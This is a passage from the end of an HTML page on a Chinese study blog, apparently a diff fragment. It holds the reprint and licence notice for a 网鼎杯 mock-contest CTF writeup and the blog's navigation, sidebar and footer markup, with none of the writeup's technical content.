+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/211855.html">https://www.ctfiot.com/211855.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%E3%80%90%E7%9B%B8%E5%85%B3%E5%88%86%E4%BA%AB%E3%80%91%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%8B%9F%E8%B5%9BWriteup.full.md">CTF大赛WP集合&#x2F;articles&#x2F;【相关分享】网鼎杯拟赛Writeup.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8B%9F%E8%B5%9B/">拟赛</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/ctf-kb/wp/Web/%E6%98%A5%E7%A7%8B%E6%9D%AFWP_-_2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%B8%89%E5%A4%A9%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/" title="春秋杯WP | 2024春秋杯冬季赛第三天题目部分解析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">春秋杯WP | 2024春秋杯冬季赛第三天题目部分解析</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/01/ctf-kb/wp/Web/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9BWriteUp/" title="第三届广东省大学生网络攻防竞赛WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第三届广东省大学生网络攻防竞赛WriteUp</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">附图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
